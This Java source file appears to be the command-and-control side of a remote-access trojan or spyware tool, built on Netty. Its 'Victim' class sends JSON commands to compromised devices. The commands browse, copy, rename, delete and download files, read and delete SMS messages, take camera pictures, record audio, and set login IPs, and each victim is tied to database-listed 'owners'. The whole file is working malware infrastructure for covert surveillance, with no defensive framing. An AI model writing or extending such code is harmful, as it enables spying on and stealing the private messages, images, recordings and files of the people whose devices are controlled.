import db.DBUsers;
import io.netty.channel.ChannelFuture;
import io.netty.channel.ChannelFutureListener;
import io.netty.channel.ChannelHandlerContext;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import java.awt.image.DataBuffer;
import java.net.SocketAddress;
import java.util.ArrayList;

public class Victim {
    private DBUsers dbUsers;
    private ChannelHandlerContext context;
    private String name;
    private ArrayList<String> owners;

    public Victim(ChannelHandlerContext context, String name) {
        this.context = context;
        this.name = name;
        this.owners = NettyServer.getDBManager().DBUsers.getOwnersByVictim(name);
    }

    public void sendAuthVictim() {
        JSONObject query = new JSONObject();
        query.put("action", "auth.victim");
        sendMessage(query);
    }

    public void sendGetFiles(String path, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "get.files");
        query.put("path", path);
        query.put("owner", owner);
        sendMessage(query);
    }

    public void sendDeleteFile(String path, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "delete.file");
        query.put("path", path);
        query.put("owner", owner);
        sendMessage(query);
    }

    private void sendMessage(JSONObject message) {
        SocketAddress address = context.channel().remoteAddress();
        System.out.println(address + " << " + message);
        context.writeAndFlush(message);
    }

    public String getName() {
        return name;
    }

    public ArrayList<String> getOwners() {
        return owners;
    }

    public void sendErrorCode(String errorCode) {
        JSONObject query = new JSONObject();
        query.put("errorCode", errorCode);
        sendMessage(query);
    }

    public void sendMakeDir(String path, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "make.dir");
        query.put("path", path);
        query.put("owner", owner);
        sendMessage(query);
    }

    public void sendRenameFile(String path, String newPath, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "rename.file");
        query.put("path", path);
        query.put("newPath", newPath);
        query.put("owner", owner);
        sendMessage(query);
    }

    public void sendGetFileInfo(String path, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "get.file.info");
        query.put("path", path);
        query.put("owner", owner);
        sendMessage(query);
    }

    public void sendCopyFile(String path, String newPath, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "copy.file");
        query.put("path", path);
        query.put("newPath", newPath);
        query.put("owner", owner);
        sendMessage(query);
    }

    public void sendSetVictimName(String newName, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "set.victim.name");
        query.put("newName", newName);
        query.put("owner", owner);
        sendMessage(query);
    }

    public void sendSetLoginIps(JSONArray ips, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "set.login.ips");
        query.put("ips", ips);
        query.put("owner", owner);
        sendMessage(query);
    }

    public void sendGetSms(String type, long count, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "get.sms");
        query.put("type", type);
        query.put("count", count);
        query.put("owner", owner);
        sendMessage(query);
    }

    public void sendDeleteSms(long id, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "delete.sms");
        query.put("id", id);
        query.put("owner", owner);
        sendMessage(query);
    }

    public void sendTakePicture(String camera, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "take.picture");
        query.put("camera", camera);
        query.put("owner", owner);
        sendMessage(query);
    }

    public void sendStartAudioRecord(long seconds, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "start.audio.record");
        query.put("seconds", seconds);
        query.put("owner", owner);
        sendMessage(query);
    }

    public void sendDownloadFile(String path, long port, String owner) {
        JSONObject query = new JSONObject();
        query.put("action", "download.file");
        query.put("path", path);
        query.put("port", port);
        query.put("owner", owner);
        sendMessage(query);
    }


}
